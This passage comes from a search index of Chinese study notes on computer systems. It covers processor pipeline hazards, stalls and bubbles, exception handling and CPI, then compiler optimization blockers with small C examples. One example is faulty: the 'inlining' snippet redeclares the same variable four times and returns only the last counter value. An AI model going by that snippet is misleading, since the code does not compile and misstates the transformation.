<p>\u200b\u5185\u5b58\u200b\u53d6\u6570\u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u8017\u65f6\u200b\u7684\u200b\u8fc7\u7a0b\u200b, \u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u5728\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u8f6c\u53d1\u200b\u5230\u200b select PC \u200b\u6a21\u5757\u200b, select PC \u200b\u6a21\u5757\u200b\u5c31\u200b\u5fc5\u987b\u200b\u7b49\u5f85\u200b\u5185\u5b58\u200b\u53d6\u51fa\u200b\u6570\u540e\u200b\u624d\u80fd\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b PC, \u200b\u7136\u540e\u200b\u624d\u80fd\u200b\u7ee7\u7eed\u200b\u8fdb\u884c\u200b\u53d6\u6307\u200b\u9636\u6bb5\u200b\u7684\u200b\u540e\u7eed\u200b\u64cd\u4f5c\u200b. \u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u53d6\u6307\u200b\u9636\u6bb5\u200b\u7684\u200b\u65f6\u95f4\u200b\u8fc7\u957f\u200b.</p> <p>\u200b\u90a3\u4e48\u200b\u4e3a\u4ec0\u4e48\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\u5192\u9669\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b ALU \u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b e_valE \u200b\u5462\u200b, \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u8f6c\u53d1\u200b\u5230\u200b valA \u200b\u7684\u200b\u65f6\u5019\u200b\u5176\u5b9e\u200b\u5df2\u7ecf\u200b\u8fdb\u884c\u200b\u5230\u200b\u4e86\u200b D \u200b\u9636\u6bb5\u200b\u7684\u200b\u672b\u5c3e\u200b, \u200b\u540e\u9762\u200b\u6ca1\u6709\u200b\u8017\u65f6\u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e86\u200b(D \u200b\u9636\u6bb5\u200b\u771f\u6b63\u200b\u8017\u65f6\u200b\u7684\u200b\u64cd\u4f5c\u200b\u662f\u4ece\u200b\u5bc4\u5b58\u5668\u200b\u6587\u4ef6\u200b\u8bfb\u51fa\u200b\u6570\u636e\u200b, \u200b\u800c\u200b\u8fd9\u200b\u4e0d\u200b\u9700\u8981\u200b\u7b49\u5f85\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6570\u636e\u200b).</p> <p>\u200b\u603b\u800c\u8a00\u4e4b\u200b, \u200b\u8f6c\u53d1\u200b\u4ec0\u4e48\u200b\u6570\u636e\u200b\u5230\u200b\u54ea\u91cc\u200b, \u200b\u5173\u952e\u200b\u8fd8\u662f\u200b\u8981\u200b\u770b\u200b PIPE \u200b\u5b9e\u73b0\u200b\u7684\u200b\u786c\u4ef6\u200b\u7ed3\u6784\u56fe\u200b, \u200b\u770b\u200b\u54ea\u91cc\u200b\u6709\u200b\u4fe1\u53f7\u200b\u6307\u5411\u200b\u524d\u9762\u200b\u7684\u200b\u6a21\u5757\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b, \u200b\u9996\u5148\u200b\u6211\u4eec\u200b\u8981\u200b\u660e\u767d\u200b\u53d1\u73b0\u200b\u5206\u652f\u200b\u9009\u62e9\u200b\u9519\u8bef\u200b\u7684\u200b\u65f6\u673a\u200b\u662f\u200b\u5728\u200b jXX \u200b\u7684\u200b E \u200b\u9636\u6bb5\u200b\u8bbf\u95ee\u200b\u6761\u4ef6\u200b\u7801\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u8fd9\u65f6\u5019\u200b\u6211\u4eec\u200b\u7684\u200b\u6d41\u6c34\u7ebf\u200b\u53d6\u51fa\u200b\u4e86\u200b\u4e24\u6761\u200b\u9519\u8bef\u200b\u7684\u200b\u6307\u4ee4\u200b, \u200b\u5206\u522b\u200b\u6b63\u5728\u200b\u6267\u884c\u200b F \u200b\u548c\u200b D \u200b\u9636\u6bb5\u200b.</p> <p>\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b, \u200b\u7531\u4e8e\u200b\u9519\u8bef\u200b\u7684\u200b\u6307\u4ee4\u200b\u8fd8\u200b\u672a\u200b\u6267\u884c\u200b\u5230\u200b E \u200b\u9636\u6bb5\u200b, \u200b\u6211\u4eec\u200b\u8fd8\u200b\u672a\u200b\u5bf9\u200b\u4efb\u4f55\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b\u9020\u6210\u200b\u5f71\u54cd\u200b, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u7b80\u5355\u200b\u7684\u200b\u53d6\u6d88\u200b\u8fd9\u200b\u4e24\u6761\u200b\u9519\u8bef\u200b\u6307\u4ee4\u200b, \u200b\u5e76\u200b\u4fee\u6539\u200b PC \u200b\u4e3a\u200b\u771f\u6b63\u200b\u7684\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b. \u200b\u53d6\u6d88\u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5728\u200b D \u200b\u548c\u200b E \u200b\u9636\u6bb5\u200b\u52a0\u5165\u200b bubble, \u200b\u8fd9\u6837\u200b\u5b83\u4eec\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u7ee7\u7eed\u6267\u884c\u200b\u4e86\u200b. </p> <p></p> <p>\u200b\u6682\u505c\u200b\u548c\u200b\u6c14\u6ce1\u200b</p> <p>\u200b\u5bf9\u4e8e\u200b\u6267\u884c\u200b\u5230\u200b\u67d0\u4e2a\u200b\u9636\u6bb5\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b, \u200b\u5982\u679c\u200b\u73b0\u5728\u200b\u4e0d\u662f\u200b\u5b83\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u673a\u200b, \u200b\u4f46\u662f\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u5b83\u200b\u540e\u9762\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u9700\u8981\u200b\u6682\u505c\u200b\u8fd9\u4e2a\u200b\u9636\u6bb5\u200b\u548c\u200b\u5b83\u200b\u524d\u9762\u200b\u7684\u200b\u9636\u6bb5\u200b, \u200b\u8fd9\u6837\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b\u8fdb\u6765\u200b\u8986\u76d6\u200b\u6389\u200b\u6211\u4eec\u200b\u7684\u200b\u6307\u4ee4\u200b. \u200b\u540e\u9762\u200b\u7684\u200b\u4e00\u4e2a\u200b\u9636\u6bb5\u200b\u8981\u200b\u63d2\u5165\u200b bubble, \u200b\u8fd9\u6837\u200b\u540e\u9762\u200b\u7684\u200b\u9636\u6bb5\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u6267\u884c\u200b. (load/use hazard)</p> <p>\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u4e22\u5f03\u200b\u7684\u200b\u6307\u4ee4\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u9700\u8981\u200b\u6682\u505c\u200b\u524d\u9762\u200b\u7684\u200b\u9636\u6bb5\u200b, \u200b\u53ea\u8981\u200b\u5728\u200b\u540e\u9762\u200b\u63d2\u5165\u200b bubble \u200b\u5c31\u884c\u4e86\u200b. (wrong branch prediction)</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#456","title":"4.5.6 \u200b\u5f02\u5e38\u200b\u5904\u7406","text":"<p>\u200b\u56de\u987e\u200b\u5f02\u5e38\u200b\u7684\u200b\u4e09\u79cd\u200b\u60c5\u51b5\u200b: - halt - \u200b\u975e\u6cd5\u200b\u6307\u4ee4\u200b - \u200b\u975e\u6cd5\u200b\u5730\u5740\u200b</p> <p>\u200b\u7b2c\u4e00\u4e2a\u200b\u7ec6\u8282\u200b\u95ee\u9898\u200b, \u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u5185\u200b, \u200b\u53ef\u80fd\u200b\u6709\u200b\u591a\u4e2a\u200b\u6307\u4ee4\u200b\u5bfc\u81f4\u200b\u5f02\u5e38\u200b, \u200b\u4f8b\u5982\u200b F \u200b\u9636\u6bb5\u200b\u7684\u200b\u975e\u6cd5\u200b\u6307\u4ee4\u200b, M \u200b\u9636\u6bb5\u200b\u7684\u200b\u975e\u6cd5\u200b\u5730\u5740\u200b, \u200b\u8fd9\u65f6\u5019\u200b\u6211\u4eec\u200b\u5e94\u8be5\u200b\u62a5\u544a\u200b M \u200b\u9636\u6bb5\u200b\u7684\u200b\u5f02\u5e38\u200b, \u200b\u56e0\u4e3a\u200b\u5b83\u200b\u662f\u200b\u6bd4\u200b F \u200b\u9636\u6bb5\u200b\u5148\u200b\u6267\u884c\u200b\u7684\u200b.</p> <p>\u200b\u7b2c\u4e8c\u4e2a\u200b\u7ec6\u8282\u200b\u95ee\u9898\u200b, \u200b\u4e00\u4e2a\u200b\u5f02\u5e38\u200b\u53ef\u80fd\u200b\u7531\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u88ab\u200b\u53d6\u6d88\u200b, \u200b\u56e0\u6b64\u200b, \u200b\u6211\u4eec\u200b\u4e0d\u80fd\u200b\u4e00\u65e6\u200b\u53d1\u73b0\u5f02\u5e38\u200b\u5c31\u200b\u7acb\u523b\u200b\u505c\u6b62\u200b.</p> <p>\u200b\u7b2c\u4e09\u4e2a\u200b\u7ec6\u8282\u200b\u95ee\u9898\u200b, \u200b\u53d1\u751f\u200b\u5f02\u5e38\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b, \u200b\u6240\u4ee5\u200b\u4e5f\u200b\u8981\u6c42\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u80fd\u200b\u5bf9\u200b\u4efb\u4f55\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b\u9020\u6210\u200b\u5f71\u54cd\u200b. \u200b\u4f8b\u5982\u200b, \u200b\u4e00\u4e2a\u200b M \u200b\u9636\u6bb5\u200b\u624d\u200b\u88ab\u200b\u53d1\u73b0\u200b\u7684\u200b\u5f02\u5e38\u200b, \u200b\u540c\u4e00\u200b\u5468\u671f\u200b E \u200b\u9636\u6bb5\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u66f4\u6539\u200b\u6761\u4ef6\u200b\u7801\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u8fd9\u662f\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u7684\u200b.</p> <p>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u4e0a\u9762\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u7ec6\u8282\u200b\u95ee\u9898\u200b, \u200b\u6211\u4eec\u200b\u8ba9\u200b\u5f02\u5e38\u200b\u72b6\u6001\u200b\u968f\u7740\u200b\u6d41\u6c34\u7ebf\u200b\u4e00\u76f4\u200b\u5ef6\u7eed\u200b. \u200b\u5f53\u200b\u6211\u4eec\u200b\u5728\u200b M \u200b\u9636\u6bb5\u200b\u6216\u200b W \u200b\u9636\u6bb5\u200b\u53d1\u73b0\u5f02\u5e38\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u80af\u5b9a\u200b\u5b83\u4eec\u200b\u4e0d\u4f1a\u200b\u7531\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u88ab\u200b\u53d6\u6d88\u200b\u4e86\u200b (\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u80af\u5b9a\u200b\u6267\u884c\u200b\u5b8c\u200b\u4e86\u200b E \u200b\u9636\u6bb5\u200b), \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u65ad\u5b9a\u200b\u7a0b\u5e8f\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5f02\u5e38\u200b, \u200b\u8fd9\u65f6\u5019\u200b\u6211\u4eec\u200b\u5c31\u8981\u200b\u7981\u6b62\u200b\u4efb\u4f55\u200b\u5bf9\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b(\u200b\u6761\u4ef6\u200b\u7801\u200b\u5bc4\u5b58\u5668\u200b, \u200b\u5185\u5b58\u200b)\u200b\u7684\u200b\u66f4\u6539\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#457-pipe","title":"4.5.7 PIPE \u200b\u5404\u200b\u9636\u6bb5\u200b\u7684\u200b\u5b9e\u73b0","text":"<p>\u200b\u53c2\u89c1\u200b pipe_std.rs</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#458","title":"4.5.8 \u200b\u6d41\u6c34\u7ebf\u200b\u63a7\u5236\u200b\u903b\u8f91","text":"<p>\u200b\u5bf9\u4e8e\u200b ret \u200b\u6307\u4ee4\u200b, \u200b\u5b9e\u9645\u4e0a\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u5728\u200b F \u200b\u9636\u6bb5\u200b\u63d2\u5165\u200b bubble, \u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6682\u505c\u200b F \u200b\u9636\u6bb5\u200b, \u200b\u5e76\u200b\u5728\u200b D \u200b\u9636\u6bb5\u200b\u63d2\u5165\u200b bubble </p> <p>\u200b\u5bf9\u4e8e\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u5230\u8fbe\u200b\u8bbf\u5b58\u200b\u9636\u6bb5\u200b, \u200b\u6211\u4eec\u200b\u4f1a\u200b: - \u200b\u7981\u6b62\u200b\u6267\u884c\u200b\u9636\u6bb5\u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b\u6761\u4ef6\u200b\u7801\u200b - \u200b\u5411\u200b M \u200b\u9636\u6bb5\u200b\u63d2\u5165\u200b bubble, \u200b\u907f\u514d\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u6570\u636e\u200b\u5199\u5165\u200b - \u200b\u5f53\u5199\u200b\u56de\u6709\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b, \u200b\u6682\u505c\u200b\u5199\u56de\u200b\u9636\u6bb5\u200b, \u200b\u56e0\u800c\u200b\u6682\u505c\u200b\u4e86\u200b\u6574\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b.</p> <p>\u200b\u6bcf\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u5bc4\u5b58\u5668\u200b\u6709\u200b\u4e24\u4e2a\u200b\u63a7\u5236\u200b\u8f93\u5165\u200b\u6682\u505c\u200b\u548c\u200b\u6c14\u6ce1\u200b. \u200b\u6b63\u5e38\u200b\u4e0b\u200b\u90fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 0, \u200b\u5982\u679c\u200b\u6682\u505c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 1. \u200b\u5bc4\u5b58\u5668\u200b\u4fdd\u6301\u200b\u5b83\u200b\u7684\u200b\u72b6\u6001\u200b. \u200b\u5982\u679c\u200b\u6c14\u6ce1\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 1, \u200b\u5bc4\u5b58\u5668\u200b\u72b6\u6001\u200b\u53d8\u4e3a\u200b\u67d0\u4e2a\u200b\u590d\u4f4d\u200b\u914d\u7f6e\u200b. \u200b\u4e24\u4e2a\u200b\u90fd\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 1 \u200b\u88ab\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4e00\u79cd\u200b\u9519\u8bef\u200b.</p> <p>\u200b\u63a7\u5236\u200b\u6761\u4ef6\u200b\u7684\u200b\u7ec4\u5408\u200b</p> <p>\u200b\u5728\u200b\u5b9e\u9645\u200b\u4e2d\u200b, \u200b\u6709\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u591a\u79cd\u200b\u5192\u9669\u200b\u7ec4\u5408\u200b\u7684\u200b\u60c5\u51b5\u200b.</p> <p></p> <p>\u200b\u56fe\u4e2d\u200b\u53ea\u6709\u200b\u7ec4\u5408\u200b A \u200b\u548c\u200b B \u200b\u53ef\u80fd\u200b\u540c\u65f6\u200b\u51fa\u73b0\u200b, \u200b\u5176\u4ed6\u200b\u90fd\u200b\u662f\u200b\u4e92\u65a5\u200b\u7684\u200b.</p> <p></p> <p>\u200b\u89c2\u5bdf\u200b\u7ec4\u5408\u200b\u5bfc\u81f4\u200b\u7684\u200b\u6682\u505c\u200b\u6c14\u6ce1\u200b\u7ed3\u679c\u200b, \u200b\u6211\u4eec\u200b\u8ba4\u4e3a\u200b\u6682\u505c\u200b\u6216\u200b\u6c14\u6ce1\u200b\u4f1a\u200b\u8986\u76d6\u200b\u6b63\u5e38\u200b\u72b6\u6001\u200b. </p> <p>\u200b\u5bf9\u4e8e\u200b\u7ec4\u5408\u200bA, \u200b\u662f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b+ret, \u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u8fd9\u6837\u200b\u4f1a\u200b\u5bfc\u81f4\u200b F \u200b\u6682\u505c\u200b, D,E \u200b\u6c14\u6ce1\u200b. \u200b\u8fd9\u200b\u5176\u5b9e\u200b\u76f8\u5f53\u4e8e\u200b\u672c\u6765\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u4f1a\u200b\u7ee7\u7eed\u200b\u53d6\u51fa\u200b\u4e24\u6761\u200b\u6307\u4ee4\u200b\u4f46\u662f\u200b\u73b0\u5728\u200b\u5c11\u53d6\u200b\u4e86\u200b\u4e00\u6761\u200b, \u200b\u8fd9\u200b\u4e5f\u200b\u6ca1\u5173\u7cfb\u200b, \u200b\u56e0\u4e3a\u200b\u540e\u9762\u200b\u6211\u4eec\u200b\u7684\u200b E \u200b\u9636\u6bb5\u200b\u6c14\u6ce1\u200b\u4f1a\u200b\u53d6\u6d88\u200b\u6389\u200b ret \u200b\u6307\u4ee4\u200b, \u200b\u8fd9\u6837\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b F \u200b\u8fd8\u662f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u6b63\u786e\u200b\u7684\u200b\u5730\u5740\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u6682\u505c\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b\u7ec4\u5408\u200bB, \u200b\u662f\u200b\u52a0\u8f7d\u200b\u4f7f\u7528\u200b+ret, \u200b\u53d1\u751f\u200b\u7684\u200b\u60c5\u51b5\u200b\u662f\u200b\u52a0\u8f7d\u200b\u6307\u4ee4\u200b\u8bbe\u7f6e\u200b %rsp, \u200b\u7136\u540e\u200b ret \u200b\u6307\u4ee4\u200b\u4f7f\u7528\u200b rsp. \u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b ret \u200b\u6307\u4ee4\u200b\u963b\u585e\u200b\u5728\u200b D \u200b\u9636\u6bb5\u200b. \u200b\u4f46\u662f\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u8fd9\u200b\u4e24\u8005\u200b\u7ec4\u5408\u200b\u4f1a\u200b\u5bfc\u81f4\u200b D \u200b\u9636\u6bb5\u200b\u51fa\u73b0\u200b\u6c14\u6ce1\u200b+\u200b\u6682\u505c\u200b. \u200b\u56e0\u6b64\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u9700\u8981\u200b\u7279\u6b8a\u200b\u5904\u7406\u200b.</p>"},{"location":"notes/ICS/Chapter%2004%20Processor%20Architecture/#459","title":"4.5.9 \u200b\u6027\u80fd\u200b\u5206\u6790","text":"<p>\u200b\u7531\u4e8e\u200b\u6c14\u6ce1\u200b\u7684\u200b\u5b58\u5728\u200b, \u200b\u6d41\u6c34\u7ebf\u200b\u4e0d\u80fd\u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u53d1\u5c04\u200b\u4e00\u6761\u200b\u65b0\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u6807\u200b, \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u63d2\u5165\u200b\u6c14\u6ce1\u200b\u7684\u200b\u6570\u91cf\u200b\u8861\u91cf\u200b\u6548\u7387\u200b\u7684\u200b\u635f\u5931\u200b. \u200b\u4e00\u4e2a\u200b load/use \u200b\u5192\u9669\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u4e00\u4e2a\u200b\u6c14\u6ce1\u200b, \u200b\u4e00\u4e2a\u200b\u8fd4\u56de\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u4e09\u4e2a\u200b\u6c14\u6ce1\u200b, \u200b\u4e00\u4e2a\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u4e24\u4e2a\u200b\u6c14\u6ce1\u200b</p> <p>CPI: \u200b\u6bcf\u200b\u6307\u4ee4\u200b\u5468\u671f\u200b\u6570\u200b. 1.0+C_b/C_i</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/","title":"Chapter 05 Optimization","text":""},{"location":"notes/ICS/Chapter%2005%20Optimization/#51","title":"5.1 \u200b\u4f18\u5316\u200b\u7f16\u8bd1\u5668\u200b\u7684\u200b\u80fd\u529b\u200b\u548c\u200b\u5c40\u9650\u6027","text":"<p>\u200b\u59a8\u788d\u200b\u4f18\u5316\u200b\u7684\u200b\u56e0\u7d20\u200b:</p> <p>\u200b\u5185\u5b58\u200b\u522b\u540d\u200b\u4f7f\u7528\u200b:</p> C<pre><code>void fun1(long *xp, long *yp) {\n    *xp += *yp;\n    *xp += *yp;\n}\nvoid fun2(long *xp, long *yp) {\n    *xp += 2* *yp;\n}\n</code></pre> <p>\u200b\u4e4d\u4e00\u770b\u200b, \u200b\u4e24\u4e2a\u200b\u51fd\u6570\u200b\u4f3c\u4e4e\u200b\u6709\u200b\u76f8\u540c\u200b\u7684\u200b\u884c\u4e3a\u200b, \u200b\u4e0b\u9762\u200b\u7684\u200b\u51fd\u6570\u200b\u5bf9\u200b\u5185\u5b58\u200b\u7684\u200b\u8bbf\u95ee\u200b\u66f4\u200b\u5c11\u200b, \u200b\u901f\u5ea6\u200b\u5e94\u8be5\u200b\u66f4\u200b\u5feb\u200b.</p> <p>\u200b\u4f46\u662f\u200b\u8003\u8651\u200b xp=yp \u200b\u7684\u200b\u60c5\u51b5\u200b, fun1 \u200b\u76f8\u5f53\u4e8e\u200b *xp * 4, \u200b\u800c\u200b fun2 \u200b\u76f8\u5f53\u4e8e\u200b *xp * 3. \u200b\u56e0\u6b64\u200b, \u200b\u7f16\u8bd1\u5668\u200b\u4e0d\u80fd\u200b\u968f\u4fbf\u200b\u4f18\u5316\u200b\u8fd9\u6837\u200b\u7684\u200b\u4ee3\u7801\u200b.</p> <p>\u200b\u51fd\u6570\u8c03\u7528\u200b:</p> C<pre><code>long f();\nlong func1() {\n    return f() + f() + f() + f();\n}\nlong func2() {\n    return 4 * f();\n}\n</code></pre> <p>\u200b\u4e24\u4e2a\u200b\u8fc7\u7a0b\u200b\u8ba1\u7b97\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u7ed3\u679c\u200b, \u200b\u4f3c\u4e4e\u200b func2() \u200b\u66f4\u200b\u5feb\u200b\u4e00\u4e9b\u200b. \u200b\u4f46\u662f\u200b\u5982\u679c\u200b f \u200b\u51fd\u6570\u200b\u6709\u200b \u200b\u526f\u4f5c\u7528\u200b, \u200b\u6bd4\u5982\u200b\u6267\u884c\u200b\u4e86\u200b\u67d0\u4e2a\u200b\u5168\u5c40\u53d8\u91cf\u200b + 1, \u200b\u90a3\u4e48\u200b\u8c03\u7528\u200b\u4e00\u6b21\u200b func1() \u200b\u4f1a\u200b +4, \u200b\u8c03\u7528\u200b\u4e00\u6b21\u200b fun2() \u200b\u53ea\u4f1a\u200b +1, \u200b\u56e0\u6b64\u200b\u7f16\u8bd1\u5668\u200b\u4e0d\u80fd\u200b\u968f\u4fbf\u200b\u5c06\u200b fun1() \u200b\u4f18\u5316\u200b\u6210\u200b fun2().</p> <p>\u200b\u7528\u200b\u5185\u8054\u200b\u51fd\u6570\u200b\u66ff\u6362\u200b\u4f18\u5316\u200b\u51fd\u6570\u8c03\u7528\u200b</p> <p>\u200b\u5305\u542b\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b\u4ee3\u7801\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e00\u4e2a\u200b\u79f0\u4e3a\u200b\u5185\u8054\u200b\u51fd\u6570\u200b\u66ff\u6362\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b, \u200b\u6b64\u65f6\u200b, \u200b\u5c06\u200b\u51fd\u6570\u8c03\u7528\u200b\u66ff\u6362\u200b\u4e3a\u200b\u51fd\u6570\u200b\u4f53\u200b. \u200b\u5373\u200b\u4fee\u6539\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e3a\u200b\u51fd\u6570\u200b\u4ee3\u7801\u200b.</p> <p>\u200b\u4f8b\u5982\u200b, \u200b\u4f7f\u7528\u200b inline \u200b\u4fee\u9970\u200b f, fun1() \u200b\u7684\u200b\u4ee3\u7801\u200b\u4f1a\u200b\u53d8\u6210\u200b\u8fd9\u6837\u200b: C<pre><code>/* Result of inlining f in fun1 */\nlong func1in() {\n   long t = counter++;\n   long t = counter++;\n   long t = counter++;\n   long t = counter++;\n   return t;\n}\n</code></pre></p> <p>\u200b\u8fd9\u6837\u200b\u7684\u200b\u8f6c\u6362\u200b\u51cf\u5c11\u200b\u4e86\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b\u5f00\u9500\u200b, \u200b\u540c\u65f6\u200b\u5141\u8bb8\u200b\u5bf9\u200b\u5c55\u5f00\u200b\u7684\u200b\u4ee3\u7801\u200b\u505a\u200b\u8fdb\u4e00\u6b65\u200b\u4f18\u5316\u200b.(\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u6210\u200b\u73b0\u5728\u200b\u7f16\u8bd1\u5668\u200b\u770b\u200b\u5f97\u5230\u200b\u51fd\u6570\u200b\u5177\u4f53\u200b\u662f\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u4e86\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u66f4\u597d\u200b\u4f18\u5316\u200b)</p> <p>\u200b\u7136\u800c\u200b GCC \u200b\u53ea\u200b\u5c1d\u8bd5\u200b\u5728\u200b\u5355\u4e2a\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200b\u51fd\u6570\u200b\u7684\u200b\u5185\u8054\u200b, \u200b\u56e0\u6b64\u200b\u65e0\u6cd5\u200b\u5e94\u7528\u200b\u4e8e\u200b\u5e38\u89c1\u200b\u7684\u200b\u5728\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u51fd\u6570\u200b, \u200b\u88ab\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\u8c03\u7528\u200b\u7684\u200b\u60c5\u51b5\u200b.</p> <p>\u200b\u6b64\u5916\u200b, \u200b\u5982\u679c\u200b\u51fd\u6570\u8c03\u7528\u200b\u88ab\u200b\u5185\u8054\u200b\u66ff\u6362\u200b\u4f18\u5316\u200b\u8fc7\u200b\u4e86\u200b, \u200b\u90a3\u4e48\u200b\u4efb\u4f55\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u8c03\u7528\u200b\u8fdb\u884c\u200b\u8ffd\u8e2a\u200b\u6216\u200b\u8bbe\u7f6e\u200b\u65ad\u70b9\u200b\u7684\u200b\u5c1d\u8bd5\u200b\u90fd\u200b\u4f1a\u200b\u5931\u8d25\u200b. \u200b\u56e0\u6b64\u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6700\u597d\u200b\u963b\u6b62\u200b\u7f16\u8bd1\u5668\u200b\u6267\u884c\u200b\u5185\u8054\u200b\u66ff\u6362\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#52","title":"5.2 \u200b\u8868\u793a\u200b\u7a0b\u5e8f\u200b\u6027\u80fd","text":"<p>\u200b\u5f15\u5165\u200b\u5ea6\u91cf\u200b\u6807\u51c6\u200b\u6bcf\u200b\u5143\u7d20\u5468\u671f\u200b\u6570\u200b(CPE)\u200b\u4f5c\u4e3a\u200b\u8868\u793a\u200b\u7a0b\u5e8f\u200b\u6027\u80fd\u200b\u5e76\u200b\u6307\u5bfc\u200b\u6211\u4eec\u200b\u6539\u8fdb\u200b\u4ee3\u7801\u200b\u7684\u200b\u65b9\u6cd5\u200b. 